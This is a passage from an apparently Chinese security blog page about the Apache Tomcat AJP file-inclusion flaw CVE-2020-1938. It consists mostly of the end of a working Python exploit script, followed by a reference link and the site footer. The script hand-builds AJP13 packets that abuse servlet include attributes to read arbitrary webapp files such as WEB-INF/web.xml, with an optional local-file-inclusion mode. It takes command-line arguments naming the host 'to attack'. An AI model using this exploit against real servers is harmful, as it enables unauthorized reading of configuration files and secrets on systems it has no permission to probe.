                res += pack_string(attr[&#39;value&#39;])
        res += struct.pack(&quot;B&quot;, 0xFF)
        return res

    def serialize(self):
        res = &quot;&quot;
        res = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)
        res += pack_string(self.protocol)
        res += pack_string(self.req_uri)
        res += pack_string(self.remote_addr)
        res += pack_string(self.remote_host)
        res += pack_string(self.server_name)
        res += struct.pack(&quot;&gt;h&quot;, self.server_port)
        res += struct.pack(&quot;?&quot;, self.is_ssl)
        res += self.pack_headers()
        res += self.pack_attributes()
        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:
            header = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))
        else:
            header = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))
        return header + res

    def parse(self, raw_packet):
        stream = StringIO(raw_packet)
        self.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)
        self.prefix_code, self.method = unpack(stream, &quot;bb&quot;)
        self.protocol = unpack_string(stream)
        self.req_uri = unpack_string(stream)
        self.remote_addr = unpack_string(stream)
        self.remote_host = unpack_string(stream)
        self.server_name = unpack_string(stream)
        self.server_port = unpack(stream, &quot;&gt;h&quot;)
        self.is_ssl = unpack(stream, &quot;?&quot;)
        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)
        self.request_headers = &#123;&#125;
        for i in range(self.num_headers):
            code, = unpack(stream, &quot;&gt;H&quot;)
            if code &gt; 0xA000:
                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]
            else:
                h_name = unpack(stream, &quot;%ds&quot; % code)
                stream.read(1)  # \0
            h_value = unpack_string(stream)
            self.request_headers[h_name] = h_value

    def send_and_receive(self, socket, stream, save_cookies=False):
        res = []
        i = socket.sendall(self.serialize())
        if self.method == AjpForwardRequest.POST:
            return res

        r = AjpResponse.receive(stream)
        assert r.prefix_code == AjpResponse.SEND_HEADERS
        res.append(r)
        if save_cookies and &#39;Set-Cookie&#39; in r.response_headers:
            self.headers[&#39;SC_REQ_COOKIE&#39;] = r.response_headers[&#39;Set-Cookie&#39;]

        # read body chunks and end response packets
        while True:
            r = AjpResponse.receive(stream)
            res.append(r)
            if r.prefix_code == AjpResponse.END_RESPONSE:
                break
            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
                continue
            else:
                raise NotImplementedError
                break

        return res


class AjpResponse(object):
    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(
        7)
    COMMON_SEND_HEADERS = [
        &quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,
        &quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;
    ]

    def parse(self, stream):
        # read headers
        self.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)

        if self.prefix_code == AjpResponse.SEND_HEADERS:
            self.parse_send_headers(stream)
        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
            self.parse_send_body_chunk(stream)
        elif self.prefix_code == AjpResponse.END_RESPONSE:
            self.parse_end_response(stream)
        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
            self.parse_get_body_chunk(stream)
        else:
            raise NotImplementedError

    def parse_send_headers(self, stream):
        self.http_status_code, = unpack(stream, &quot;&gt;H&quot;)
        self.http_status_msg = unpack_string(stream)
        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)
        self.response_headers = &#123;&#125;
        for i in range(self.num_headers):
            code, = unpack(stream, &quot;&gt;H&quot;)
            if code &lt;= 0xA000:  # custom header
                h_name, = unpack(stream, &quot;%ds&quot; % code)
                stream.read(1)  # \0
                h_value = unpack_string(stream)
            else:
                h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]
                h_value = unpack_string(stream)
            self.response_headers[h_name] = h_value

    def parse_send_body_chunk(self, stream):
        self.data_length, = unpack(stream, &quot;&gt;H&quot;)
        self.data = stream.read(self.data_length+1)

    def parse_end_response(self, stream):
        self.reuse, = unpack(stream, &quot;b&quot;)

    def parse_get_body_chunk(self, stream):
        rlen, = unpack(stream, &quot;&gt;H&quot;)
        return rlen

    @staticmethod
    def receive(stream):
        r = AjpResponse()
        r.parse(stream)
        return r


def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
    fr.method = method
    fr.protocol = &quot;HTTP/1.1&quot;
    fr.req_uri = req_uri
    fr.remote_addr = target_host
    fr.remote_host = None
    fr.server_name = target_host
    fr.server_port = 80
    fr.request_headers = &#123;
        &#39;SC_REQ_ACCEPT&#39;: &#39;text/html&#39;,
        &#39;SC_REQ_CONNECTION&#39;: &#39;keep-alive&#39;,
        &#39;SC_REQ_CONTENT_LENGTH&#39;: &#39;0&#39;,
        &#39;SC_REQ_HOST&#39;: target_host,
        &#39;SC_REQ_USER_AGENT&#39;: &#39;Mozilla&#39;,
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,
        &#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;,
        &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
        &#39;Cache-Control&#39;: &#39;max-age=0&#39;
    &#125;
    fr.is_ssl = False
    fr.attributes = []
    return fr


class Tomcat(object):
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile(&quot;rb&quot;, bufsize=0)

    def perform_request(self, req_uri, headers=&#123;&#125;, method=&#39;GET&#39;, user=None, password=None, attributes=[], lfi=False):
        if lfi:
            self.req_uri = req_uri + &#39;.jspx&#39;
        else:
            self.req_uri = req_uri
        self.forward_request = prepare_ajp_forward_request(
            self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
        print(&quot;Getting resource at ajp13://%s:%d%s&quot; %
              (self.target_host, self.target_port, req_uri))
        if user is not None and password is not None:
            self.forward_request.request_headers[&#39;SC_REQ_AUTHORIZATION&#39;] = &quot;Basic &quot; + (
                &quot;%s:%s&quot; % (user, password)).encode(&#39;base64&#39;).replace(&#39;\n&#39;, &#39;&#39;)
        for h in headers:
            self.forward_request.request_headers[h] = headers[h]
        for a in attributes:
            self.forward_request.attributes.append(a)
        responses = self.forward_request.send_and_receive(
            self.socket, self.stream)
        if len(responses) == 0:
            return None, None
        snd_hdrs_res = responses[0]
        data_res = responses[1:-1]
        if len(data_res) == 0:
            print(&quot;No data in response. Headers:%s\n&quot; %
                  snd_hdrs_res.response_headers)
        return snd_hdrs_res, data_res


parser = argparse.ArgumentParser()
parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)
parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, type=int, default=8009,
                    help=&quot;AJP port to attack (default is 8009)&quot;)
parser.add_argument(&#39;-w&#39;, &#39;--webapp&#39;, type=str, default=&#39;ROOT&#39;,
                    help=&quot;Which webapp to attack (default is ROOT&quot;)
parser.add_argument(&#39;-f&#39;, &#39;--file&#39;, type=str,
                    default=&#39;WEB-INF/web.xml&#39;, help=&quot;file path :(WEB-INF/web.xml)&quot;)
parser.add_argument(&#39;-l&#39;, &#39;--lfi&#39;, action=&quot;store_true&quot;,
                    help=&quot;local file include&quot;)
args = parser.parse_args()
t = Tomcat(args.target, args.port)
_, data = t.perform_request(&#39;/&#39;+args.webapp+&#39;/&#39;, attributes=[
    &#123;&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [
        &#39;javax.servlet.include.request_uri&#39;, &#39;/&#39;]&#125;,
    &#123;&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [
        &#39;javax.servlet.include.path_info&#39;, args.file]&#125;,
    &#123;&#39;name&#39;: &#39;req_attribute&#39;, &#39;value&#39;: [
        &#39;javax.servlet.include.servlet_path&#39;, &#39;/&#39;]&#125;,
], lfi=args.lfi)
print(&#39;----------------------------&#39;)
print(&quot;&quot;.join([d.data for d in data]))
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/801">https://forum.90sec.com/t/topic/801</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwzn00jiy8v12ux9br6j" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Tomcat/%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>